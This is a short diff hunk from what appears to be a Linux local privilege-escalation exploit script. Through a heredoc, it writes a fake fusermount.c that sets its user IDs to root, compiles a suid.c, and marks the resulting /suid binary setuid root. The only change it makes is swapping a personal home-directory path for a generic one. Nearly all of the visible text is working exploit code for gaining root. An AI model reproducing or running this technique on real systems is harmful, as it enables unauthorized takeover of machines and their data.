@@ -17,7 +17,7 @@ cat >fusermount.c<<EOF
 int main(int argc, char **argv)
 {
   setreuid(0,0);
-  system("/usr/bin/gcc /home/tyken/suid.c -o /suid && /usr/bin/chmod +s /suid");
+  system("/usr/bin/gcc /home/user/suid.c -o /suid && /usr/bin/chmod +s /suid");
   return(0);
 }
 EOF
